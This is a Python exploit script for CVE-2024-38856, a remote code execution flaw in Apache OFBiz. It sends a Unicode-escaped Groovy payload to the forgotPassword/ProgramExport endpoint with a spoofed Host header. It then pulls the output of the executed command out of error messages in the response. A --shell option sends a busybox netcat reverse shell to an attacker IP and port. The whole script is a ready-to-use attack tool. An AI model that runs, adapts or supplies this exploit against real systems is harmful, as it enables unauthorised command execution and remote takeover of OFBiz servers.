import requests
import argparse
from urllib3.exceptions import InsecureRequestWarning
from bs4 import BeautifulSoup
import re

# Disable warnings for self-signed certificates
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def to_unicode_escape(string):
    return ''.join(f'\\u{ord(c):04x}' for c in string)

def extract_command_output(html_content):
    try:
        exception_match = re.search(r'Exception[^>]*>(.*?)</p>', html_content, re.DOTALL)
        if exception_match:
            output = exception_match.group(1).strip()
            return output.replace('&lt;', '<').replace('&gt;', '>').replace('&quot;', '"')

        soup = BeautifulSoup(html_content, 'html.parser')
        error_divs = soup.find_all('div', {'class': ['content-messages', 'errorMessage']})
        for div in error_divs:
            error_text = div.get_text("\n", strip=True)
            match = re.search(r'Exception:\s*(.*)', error_text, re.DOTALL)
            if match:
                return re.sub(r'</?[^>]+>', '', match.group(1).strip())

        if "Exception" in html_content:
            return html_content.split("Exception")[-1].strip()
    except Exception as e:
        print(f"{bcolors.WARNING}[!] Error parsing response: {e}{bcolors.ENDC}")
    return None

def send_linux_command(target, command, proxy=None):
    url = f"{target}/webtools/control/forgotPassword/ProgramExport"
    payload = f"throw new Exception('{command}'.execute().text);"
    unicode_payload = "groovyProgram=" + to_unicode_escape(payload)
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "Host": "127.0.0.1"
    }
    proxies = {"http": proxy, "https": proxy} if proxy else None

    try:
        print(f"{bcolors.OKCYAN}[*] Sending command '{command}' to {url}{bcolors.ENDC}")
        r = requests.post(url, data=unicode_payload, headers=headers, verify=False, timeout=15, proxies=proxies)
        print(f"{bcolors.OKGREEN}[+] Response Status Code: {r.status_code}{bcolors.ENDC}")
        command_output = extract_command_output(r.text)
        if command_output:
            print(f"\n{bcolors.BOLD}Command Output:{bcolors.ENDC}")
            print(f"{bcolors.OKBLUE}{command_output}{bcolors.ENDC}")
        else:
            print(f"{bcolors.WARNING}[!] Could not extract command output from response{bcolors.ENDC}")
            print(f"\n{bcolors.BOLD}Partial Response:{bcolors.ENDC}")
            print(r.text[:1500] + ("..." if len(r.text) > 1500 else ""))
    except requests.exceptions.Timeout:
        print(f"{bcolors.FAIL}[!] Request timed out{bcolors.ENDC}")
    except requests.exceptions.RequestException as e:
        print(f"{bcolors.FAIL}[!] Request error: {e}{bcolors.ENDC}")
    except Exception as e:
        print(f"{bcolors.FAIL}[!] Error: {e}{bcolors.ENDC}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="CVE-2024-38856 Exploit Script - Apache OFBiz RCE (Linux Only)")
    parser.add_argument("-u", "--url", required=True, help="Target base URL (ex: https://10.8.0.2:8443)")
    parser.add_argument("-c", "--cmd", help="Linux command to execute")
    parser.add_argument("--shell", action="store_true", help="Trigger reverse shell using busybox")
    parser.add_argument("--lhost", help="Attacker IP for reverse shell")
    parser.add_argument("--lport", help="Attacker port for reverse shell")
    parser.add_argument("--proxy", help="Proxy (ex: http://127.0.0.1:8080)")

    args = parser.parse_args()

    print(f"{bcolors.HEADER}\nCVE-2024-38856 Exploit - Apache OFBiz RCE (Linux Only){bcolors.ENDC}")
    print(f"{bcolors.UNDERLINE}Target: {args.url}{bcolors.ENDC}\n")

    if args.shell:
        if not args.lhost or not args.lport:
            print(f"{bcolors.FAIL}[!] --shell requires both --lhost and --lport.{bcolors.ENDC}")
            exit(1)
        reverse_cmd = f"busybox nc {args.lhost} {args.lport} -e /bin/bash"
        print(f"{bcolors.OKCYAN}[*] Reverse Shell Payload: {reverse_cmd}{bcolors.ENDC}")
        send_linux_command(args.url.rstrip("/"), reverse_cmd, args.proxy)
    elif args.cmd:
        send_linux_command(args.url.rstrip("/"), args.cmd, args.proxy)
    else:
        print(f"{bcolors.FAIL}[!] Provide either --cmd or --shell with --lhost and --lport.{bcolors.ENDC}")
